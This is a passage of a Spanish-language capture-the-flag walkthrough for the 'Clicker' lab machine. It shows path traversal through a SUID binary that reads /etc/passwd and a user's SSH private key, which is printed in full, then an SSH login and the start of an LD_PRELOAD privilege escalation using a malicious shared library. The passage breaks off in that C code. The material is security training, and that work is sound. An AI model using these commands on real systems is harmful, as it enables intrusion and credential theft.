</span></span><span style="display:flex;"><span>      sVar5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(pcVar3);
</span></span><span style="display:flex;"><span>      pcVar3 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">calloc</span>(sVar5 <span style="color:#f92672">+</span> sVar4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">strcat</span>(pcVar3,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_78);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">strcat</span>(pcVar3,__dest);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">system</span>(pcVar3);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;File not readable or not found&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>Resumidamente este código hace lo siguiente:</p>
<h3 id="1-revisión-de-argumentos">1. <strong>Revisión de Argumentos</strong>:</h3>
<ul>
<li>El código verifica si el número de argumentos (<code>param_1</code>) es menor que 2. Si es así, imprime un mensaje de error y termina el programa con un código de retorno 1.</li>
<li>Si el número de argumentos es suficiente, convierte el segundo argumento en un entero usando <code>atoi()</code>.</li>
</ul>
<h3 id="2-asignación-de-nombre-de-archivo">2. <strong>Asignación de Nombre de Archivo</strong>:</h3>
<ul>
<li>Dependiendo del valor del entero <code>iVar1</code>, que se obtiene del segundo argumento, selecciona un nombre de archivo SQL predeterminado:
<ul>
<li><code>1</code> → &ldquo;create.sql&rdquo;</li>
<li><code>2</code> → &ldquo;populate.sql&rdquo;</li>
<li><code>3</code> → &ldquo;reset_password.sql&rdquo;</li>
<li><code>4</code> → &ldquo;clean.sql&rdquo;</li>
<li>Cualquier otro valor usará el tercer argumento proporcionado (<code>*(char **)(param_2 + 0x10)</code>) como nombre de archivo.</li>
</ul>
</li>
</ul>
<p>Es decir, que como segundo argumento podemos poner lo que sea y de tercer argumento podemos poner un archivo y el binario leerá este archivo y lo reportará por pantalla y como este binario debido al permiso SUID lo está ejecutando <code>jack</code> podríamos intentar leer archivos de este usuario.</p>
<p>Primero vamos a leer el <code>/etc/passwd</code> para comprobar que esto es así.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query <span style="color:#ae81ff">2123123</span> ../../../etc/passwd
</span></span><span style="display:flex;"><span>mysql: <span style="color:#f92672">[</span>Warning<span style="color:#f92672">]</span> Using a password on the command line interface can be insecure.
</span></span><span style="display:flex;"><span>--------------
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>.........
</span></span></code></pre></div><p>Y funciona. Tener en cuenta que este archivo lo hemos leido como <code>jack</code></p>
<p>Por alguna razón no podía leer la id_rsa.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query <span style="color:#ae81ff">2123</span> ../../../home/jack/.ssh/id_rsa
</span></span><span style="display:flex;"><span>mysql: <span style="color:#f92672">[</span>Warning<span style="color:#f92672">]</span> Using a password on the command line interface can be insecure.
</span></span><span style="display:flex;"><span>ERROR: Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t initialize batch_readline - may be the input source is a directory or a block device.
</span></span></code></pre></div><p>Probando un rato por alguna razón probando <code>../.ssh/id_rsa</code> pude leer la clave privada de <code>jack</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query <span style="color:#ae81ff">21</span> ../.ssh/id_rsa
</span></span><span style="display:flex;"><span>mysql: <span style="color:#f92672">[</span>Warning<span style="color:#f92672">]</span> Using a password on the command line interface can be insecure.
</span></span><span style="display:flex;"><span>--------------
</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY---
</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAYEAs4eQaWHe45iGSieDHbraAYgQdMwlMGPt50KmMUAvWgAV2zlP8/1Y
</span></span><span style="display:flex;"><span>J/tSzgoR9Fko8I1UpLnHCLz2Ezsb/MrLCe8nG5TlbJrrQ4HcqnS4TKN7DZ7XW0bup3ayy1
</span></span><span style="display:flex;"><span>kAAZ9Uot6ep/ekM8E+7/39VZ5fe1FwZj4iRKI+g/BVQFclsgK02B594GkOz33P/Zzte2jV
</span></span><span style="display:flex;"><span>Tgmy3+htPE5My31i2lXh6XWfepiBOjG+mQDg2OySAphbO1SbMisowP1aSexKMh7Ir6IlPu
</span></span><span style="display:flex;"><span>nuw3l/luyvRGDN8fyumTeIXVAdPfOqMqTOVECo7hAoY+uYWKfiHxOX4fo+/fNwdcfctBUm
</span></span><span style="display:flex;"><span>pr5Nxx0GCH1wLnHsbx+/oBkPzxuzd+BcGNZp7FP8cn+dEFz2ty8Ls0Mr+XW5ofivEwr3+e
</span></span><span style="display:flex;"><span>30OgtpL6QhO2eLiZVrIXOHiPzW49emv4xhuoPF3E/5CA6akeQbbGAppTi+EBG9Lhr04c9E
</span></span><span style="display:flex;"><span>2uCSLPiZqHiViArcUbbXxWMX2NPSJzDsQ4xeYqFtAAAFiO2Fee3thXntAAAAB3NzaC1yc2
</span></span><span style="display:flex;"><span>EAAAGBALOHkGlh3uOYhkongx262gGIEHTMJTBj7edCpjFAL1oAFds5T/P9WCf7Us4KEfRZ
</span></span><span style="display:flex;"><span>KPCNVKS5xwi89hM7G/zKywnvJxuU5Wya60OB3Kp0uEyjew2e11tG7qd2sstZAAGfVKLenq
</span></span><span style="display:flex;"><span>f3pDPBPu/9/VWeX3tRcGY+IkSiPoPwVUBXJbICtNgefeBpDs99z/2c7Xto1U4Jst/obTxO
</span></span><span style="display:flex;"><span>TMt9YtpV4el1n3qYgToxvpkA4NjskgKYWztUmzIrKMD9WknsSjIeyK+iJT7p7sN5f5bsr0
</span></span><span style="display:flex;"><span>RgzfH8rpk3iF1QHT3zqjKkzlRAqO4QKGPrmFin4h8Tl+H6Pv3zcHXH3LQVJqa+TccdBgh9
</span></span><span style="display:flex;"><span>cC5x7G8fv6AZD88bs3fgXBjWaexT/HJ/nRBc9rcvC7NDK/l1uaH4rxMK9/nt9DoLaS+kIT
</span></span><span style="display:flex;"><span>tni4mVayFzh4j81uPXpr+MYbqDxdxP+QgOmpHkG2xgKaU4vhARvS4a9OHPRNrgkiz4mah4
</span></span><span style="display:flex;"><span>lYgK3FG218VjF9jT0icw7EOMXmKhbQAAAAMBAAEAAAGACLYPP83L7uc7vOVl609hvKlJgy
</span></span><span style="display:flex;"><span>FUvKBcrtgBEGq44XkXlmeVhZVJbcc4IV9Dt8OLxQBWlxecnMPufMhld0Kvz2+XSjNTXo21
</span></span><span style="display:flex;"><span>1LS8bFj1iGJ2WhbXBErQ0bdkvZE3+twsUyrSL/xIL2q1DxgX7sucfnNZLNze9M2akvRabq
</span></span><span style="display:flex;"><span>DL53NSKxpvqS/v1AmaygePTmmrz/mQgGTayA5Uk5sl7Mo2CAn5Dw3PV2+KfAoa3uu7ufyC
</span></span><span style="display:flex;"><span>kMJuNWT6uUKR2vxoLT5pEZKlg8Qmw2HHZxa6wUlpTSRMgO+R+xEQsemUFy0vCh4TyezD3i
</span></span><span style="display:flex;"><span>SlyE8yMm8gdIgYJB+FP5m4eUyGTjTE4+lhXOKgEGPcw9+MK7Li05Kbgsv/ZwuLiI8UNAhc
</span></span><span style="display:flex;"><span>9vgmEfs/hoiZPX6fpG+u4L82oKJuIbxF/I2Q2YBNIP9O9qVLdxUniEUCNl3BOAk/8H6usN
</span></span><span style="display:flex;"><span>9pLG5kIalMYSl6lMnfethUiUrTZzATPYT1xZzQCdJ+qagLrl7O33aez3B/OAUrYmsBAAAA
</span></span><span style="display:flex;"><span>wQDB7xyKB85+On0U9Qk1jS85dNaEeSBGb7Yp4e/oQGiHquN/xBgaZzYTEO7WQtrfmZMM4s
</span></span><span style="display:flex;"><span>SXT5qO0J8TBwjmkuzit3/BjrdOAs8n2Lq8J0sPcltsMnoJuZ3Svqclqi8WuttSgKPyhC4s
</span></span><span style="display:flex;"><span>FQsp6ggRGCP64C8N854//KuxhTh5UXHmD7+teKGdbi9MjfDygwk+gQ33YIr2KczVgdltwW
</span></span><span style="display:flex;"><span>EhA8zfl5uimjsT31lks3jwk/I8CupZGrVvXmyEzBYZBegl3W4AAADBAO19sPL8ZYYo1n2j
</span></span><span style="display:flex;"><span>rghoSkgwA8kZJRy6BIyRFRUODsYBlK0ItFnriPgWSE2b3iHo7cuujCDju0yIIfF2QG87Hh
</span></span><span style="display:flex;"><span>zXj1wghocEMzZ3ELIlkIDY8BtrewjC3CFyeIY3XKCY5AgzE2ygRGvEL+YFLezLqhJseV8j
</span></span><span style="display:flex;"><span>3kOhQ3D6boridyK3T66YGzJsdpEvWTpbvve3FM5pIWmA5LUXyihP2F7fs2E5aDBUuLJeyi
</span></span><span style="display:flex;"><span>F0YCoftLetCA/kiVtqlT0trgO8Yh+78QAAAMEAwYV0GjQs3AYNLMGccWlVFoLLPKGItynr
</span></span><span style="display:flex;"><span>Xxa/j3qOBZ+HiMsXtZdpdrV26N43CmiHRue4SWG1m/Vh3zezxNymsQrp6sv96vsFjM7gAI
</span></span><span style="display:flex;"><span>JJK+Ds3zu2NNNmQ82gPwc/wNM3TatS/Oe4loqHg3nDn5CEbPtgc8wkxheKARAz0SbztcJC
</span></span><span style="display:flex;"><span>LsOxRu230Ti7tRBOtV153KHlE4Bu7G/d028dbQhtfMXJLu96W1l3Fr98pDxDSFnig2HMIi
</span></span><span style="display:flex;"><span>lL4gSjpD/FjWk9AAAADGphY2tAY2xpY2tlcgECAwQFBg<span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY---
</span></span><span style="display:flex;"><span>--------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ERROR <span style="color:#ae81ff">1064</span> <span style="color:#f92672">(</span>42000<span style="color:#f92672">)</span> at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span style="color:#66d9ef">for</span> the right syntax to use near <span style="color:#e6db74">&#39;-----BEGIN OPENSSH PRIVATE KEY---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA&#39;</span> at line <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Ahora que tenemos la clave privada de <code>jack</code> podemos iniciar sesión por SSH como este usuario</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">600</span> id_rsa 
</span></span><span style="display:flex;"><span>┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/clicker/content<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ ssh -i id_rsa jack@clicker.htb
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 22.04.3 LTS <span style="color:#f92672">(</span>GNU/Linux 5.15.0-84-generic x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System information as of Tue Aug <span style="color:#ae81ff">13</span> 04:52:32 PM UTC <span style="color:#ae81ff">2024</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System load:           0.00439453125
</span></span><span style="display:flex;"><span>  Usage of /:            53.3% of 5.77GB
</span></span><span style="display:flex;"><span>  Memory usage:          19%
</span></span><span style="display:flex;"><span>  Swap usage:            0%
</span></span><span style="display:flex;"><span>  Processes:             <span style="color:#ae81ff">247</span>
</span></span><span style="display:flex;"><span>  Users logged in:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> eth0: 10.129.244.53
</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> eth0: dead:beef::250:56ff:fe94:b37a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Expanded Security Maintenance <span style="color:#66d9ef">for</span> Applications is not enabled.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> updates can be applied immediately.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Enable ESM Apps to receive additional future security updates.
</span></span><span style="display:flex;"><span>See https://ubuntu.com/esm or run: sudo pro status
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Last login: Tue Aug <span style="color:#ae81ff">13</span> 16:52:33 <span style="color:#ae81ff">2024</span> from 10.10.14.85
</span></span><span style="display:flex;"><span>To run a command as administrator <span style="color:#f92672">(</span>user <span style="color:#e6db74">&#34;root&#34;</span><span style="color:#f92672">)</span>, use <span style="color:#e6db74">&#34;sudo &lt;command&gt;&#34;</span>.
</span></span><span style="display:flex;"><span>See <span style="color:#e6db74">&#34;man sudo_root&#34;</span> <span style="color:#66d9ef">for</span> details.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>jack@clicker:~$ whoami
</span></span><span style="display:flex;"><span>jack
</span></span></code></pre></div><p>Y podríamos leer la flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ack@clicker:~$ cat user.txt 
</span></span><span style="display:flex;"><span>d97427a66f43a70a...
</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Podemos observar que <code>jack</code> puede ejecutar cualquier comando como el usuario que el quiera pero necesitamos la credencial de <code>jack</code>, cosa que no tenemos.</p>
<p>Además podemos ejecutar como root y sin contraseña el script <code>/opt/monitor.sh</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>jack@clicker:~$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> jack on clicker:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin,
</span></span><span style="display:flex;"><span>    use_pty
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User jack may run the following commands on clicker:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> ALL
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> SETENV: NOPASSWD: /opt/monitor.sh
</span></span></code></pre></div><p>También detectamos que este usuario pertenece al grupo <code>adm</code> por lo cual podríamos leer algunos logs en <code>/var/log</code></p>
<p>No podemos modificar este script.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">504</span> Jul <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2023</span> /opt/monitor.sh
</span></span></code></pre></div><p>Ejecutando este script nos devuelve un fichero XML</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-XML" data-lang="XML"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;data&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;timestamp&gt;</span>1723571776<span style="color:#f92672">&lt;/timestamp&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;date&gt;</span>2024/08/13 05:56:16pm<span style="color:#f92672">&lt;/date&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;php-version&gt;</span>8.1.2-1ubuntu2.14<span style="color:#f92672">&lt;/php-version&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;test-connection-db&gt;</span>OK<span style="color:#f92672">&lt;/test-connection-db&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;memory-usage&gt;</span>392704<span style="color:#f92672">&lt;/memory-usage&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;environment&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;APACHE_RUN_DIR&gt;</span>/var/run/apache2<span style="color:#f92672">&lt;/APACHE_RUN_DIR&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;SYSTEMD_EXEC_PID&gt;</span>1173<span style="color:#f92672">&lt;/SYSTEMD_EXEC_PID&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;APACHE_PID_FILE&gt;</span>/var/run/apache2/apache2.pid<span style="color:#f92672">&lt;/APACHE_PID_FILE&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;JOURNAL_STREAM&gt;</span>8:26796<span style="color:#f92672">&lt;/JOURNAL_STREAM&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;PATH&gt;</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<span style="color:#f92672">&lt;/PATH&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;INVOCATION_ID&gt;</span>9d410bb08fb8413485c944cf3e9f9476<span style="color:#f92672">&lt;/INVOCATION_ID&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;APACHE_LOCK_DIR&gt;</span>/var/lock/apache2<span style="color:#f92672">&lt;/APACHE_LOCK_DIR&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;LANG&gt;</span>C<span style="color:#f92672">&lt;/LANG&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;APACHE_RUN_USER&gt;</span>www-data<span style="color:#f92672">&lt;/APACHE_RUN_USER&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;APACHE_RUN_GROUP&gt;</span>www-data<span style="color:#f92672">&lt;/APACHE_RUN_GROUP&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;APACHE_LOG_DIR&gt;</span>/var/log/apache2<span style="color:#f92672">&lt;/APACHE_LOG_DIR&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;PWD&gt;</span>/<span style="color:#f92672">&lt;/PWD&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/environment&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/data&gt;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$EUID<span style="color:#e6db74">&#34;</span> -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">then</span> echo <span style="color:#e6db74">&#34;Error, please run as root&#34;</span>
</span></span><span style="display:flex;"><span>  exit
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>set PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</span></span><span style="display:flex;"><span>unset PERL5LIB;
</span></span><span style="display:flex;"><span>unset PERLLIB;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/curl -s http://clicker.htb/diagnostic.php?token<span style="color:#f92672">=</span>secret_diagnostic_token<span style="color:#66d9ef">)</span>;
</span></span><span style="display:flex;"><span>/usr/bin/xml_pp <span style="color:#f92672">&lt;&lt;&lt;</span> $data;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $NOSAVE <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;true&#34;</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>    exit;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    timestamp<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/date +%s<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>    /usr/bin/echo $data &gt; /root/diagnostic_files/diagnostic_<span style="color:#e6db74">${</span>timestamp<span style="color:#e6db74">}</span>.xml
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span></code></pre></div><ul>
<li>
<ul>
<li>Usa <code>curl</code> para realizar una solicitud HTTP a <code>http://clicker.htb/diagnostic.php?token=secret_diagnostic_token</code>, guardando el resultado en la variable <code>data</code>. La opción <code>-s</code> (silent) suprime la salida de progreso y errores de <code>curl</code>.</li>
</ul>
</li>
<li>
<p><strong>Formatea y muestra los datos XML</strong>:</p>
<ul>
<li>El comando <code>/usr/bin/xml_pp</code> (una utilidad Perl para formatear y mostrar XML) se usa para formatear los datos obtenidos de la URL.</li>
</ul>
</li>
<li>
<p><strong>Condicional para guardar los datos</strong>:</p>
<ul>
<li>Si la variable de entorno <code>NOSAVE</code> está establecida en <code>&quot;true&quot;</code>, el script se detiene (<code>exit</code>).</li>
<li>Si <code>NOSAVE</code> no está en <code>&quot;true&quot;</code>, el script obtiene una marca de tiempo (<code>timestamp</code>) utilizando el comando <code>date +%s</code>, que proporciona el número de segundos desde el Epoch (1 de enero de 1970).</li>
<li>Finalmente, guarda los datos obtenidos en un archivo XML dentro del directorio <code>/root/diagnostic_files/</code>, nombrando el archivo con el formato <code>diagnostic_&lt;timestamp&gt;.xml</code>.</li>
</ul>
</li>
</ul>
<p>Si ejecutamos otra vez el <code>sudo -l</code> vemos que tenemos el parámetro <code>SETENV</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> SETENV: NOPASSWD: /opt/monitor.sh
</span></span></code></pre></div><p>Esto significa que podemos inyectar variables de entorno que se pasarán en tiempo de ejecución al script.
No podemos hacer un path hijacking ya que vemos que se está reemplazando el PATH dentro del script pero podemos hacer mas cosas.</p>
<p>Buscando un poco en Google podemos encontrar el <a href="https://systemweakness.com/linux-privilege-escalation-with-ld-preload-sudo-a13e0b755ede">siguiente artículo</a>
<img src="images/Screenshot_32.png" alt="Write-up Image"></p>
<p>Aquí entra en juego la variable de entorno <code>LD_PRELOAD</code></p>
<blockquote>
<p><strong>What is LD_PRELOAD ?</strong></p>
<p>Ans : <strong>LD_PRELOAD</strong> is an optional Environment Variable that is used to set/load Shared Libraries to a program or script. That means we can set the value of the <strong>LD_PRELOAD</strong> Environment Variable for a program to tell the program to load the mentioned libraries in it’s memory before starting.</p>
</blockquote>
<p>Y el artículo dicta que debemos revisar si tenemos permiso para establecer variables de entorno (si) y si tenemos establecido <code>env_keep += LD_PRELOAD</code> en el archivo <code>/etc/sudoers</code> . Pero que si tenemos el parámetro <code>SETENV</code> es suficiente.</p>
<blockquote>
<p>Enumerate to see if we have permission to set the environment variable for the script or program. In this case we see that we can SETENV which means the same. Also see if the <code>env_keep += LD_PRELOAD</code> is set here or in the sudoers file. In this case we don’t see that but the SETENV is enough.</p>
</blockquote>
<p>Por lo cual podemos realizar esta escalada de privilegios creando una librería compartida maliciosa que ejecutará un comando a nivel de sistema. Esta librería se cargará cuando ejecutemos con sudo el script que hemos detectado.</p>
<p>La máquina víctima no tiene <code>gcc</code> así que me va a tocar compilarlo en mi máquina de atacante.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>jack@clicker:/tmp$ which gcc
</span></span><span style="display:flex;"><span>jack@clicker:/tmp$
</span></span></code></pre></div><p>Entonces creamos la librería compartida maliciosa.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">_init</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unsetenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
